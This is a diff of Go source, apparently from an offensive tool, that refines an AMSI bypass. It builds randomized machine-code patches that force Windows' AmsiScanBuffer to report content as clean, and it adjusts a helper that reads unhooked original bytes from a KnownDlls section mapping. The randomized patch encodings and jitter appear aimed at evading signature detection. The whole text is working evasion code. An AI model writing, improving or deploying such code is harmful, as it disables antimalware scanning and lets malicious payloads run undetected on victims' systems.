@@ -57,16 +57,29 @@ func jitter(min, max time.Duration) {
 func randomPatchBytes() []byte {
 	zeroReg := [][]byte{
 		{0x33, 0xC0},       // xor eax, eax
-		{0x31, 0xC0},       // xor eax, eax
+		{0x31, 0xC0},       // xor eax, eax (alternative encoding)
 		{0x29, 0xC0},       // sub eax, eax
 		{0x48, 0x31, 0xC0}, // xor rax, rax
-		{0x48, 0x31, 0xC0}, // xor rax, rax (second variant)
 	}
 	reg := zeroReg[mrand.Intn(len(zeroReg))]
 	patch := make([]byte, patchLen)
-	copy(patch, reg)
-	patch[len(reg)] = 0xC3 // ret
-	for i := len(reg) + 1; i < patchLen; i++ {
+
+	// On x64, R9 holds the 5th argument (the AMSI_RESULT *result out-
+	// parameter for AmsiScanBuffer). Write 0 to *R9 so the caller sees
+	// AMSI_RESULT_CLEAN.  C7 01 00 00 00 00 = mov dword ptr [rcx], 0
+	// — but R9 is the out-param, not RCX.  Use R9 directly:
+	//   41 C7 01 00 00 00 00  =  mov dword ptr [r9], 0
+	patch[0] = 0x41
+	patch[1] = 0xC7
+	patch[2] = 0x01
+	// bytes 3..6 = 0 (immediate dword 0)
+
+	off := 7
+	copy(patch[off:], reg)
+	off += len(reg)
+	patch[off] = 0xC3 // ret
+	off++
+	for i := off; i < patchLen; i++ {
 		patch[i] = 0xCC // int3 padding
 	}
 	return patch
@@ -154,10 +167,11 @@ func resolveFuncFromBase(base uintptr, funcName string) (*funcPatch, error) {
 	}, nil
 }
 
-// resolveFuncFromKnownDlls resolves an export address by mapping a fresh
-// view of the KnownDll section. The returned address is in the NEW mapping,
-// NOT in the already-loaded module. This is useful for reading the on-disk
-// original bytes (for restore) but NOT for patching the live function.
+// resolveFuncFromKnownDlls reads clean on-disk original bytes by mapping
+// a fresh view of the KnownDll section. The returned funcPatch.addr is
+// set to 0 because the mapping is unmapped before returning — only the
+// orig bytes are valid. Callers must NOT use the returned addr for
+// patching or reading.
 func resolveFuncFromKnownDlls(dllName, funcName string) (*funcPatch, error) {
 	nt := syscall.NewLazyDLL("ntdll.dll")
 	openSection := nt.NewProc("NtOpenSection")
@@ -235,11 +249,12 @@ func resolveFuncFromKnownDlls(dllName, funcName string) (*funcPatch, error) {
 	}
 
 	// Unmap the view — we only needed the bytes for orig.
+	// addr is set to 0 to indicate this is not a patchable address.
 	unmapView.Call(^uintptr(0), base, 0)
 	closeHandle.Call(sectionHandle)
 
 	return &funcPatch{
-		addr:     uintptr(fn),
+		addr:     0, // intentionally invalid — view was unmapped
 		orig:     orig,
 		origProt: origProt,
 		dllName:  dllName,
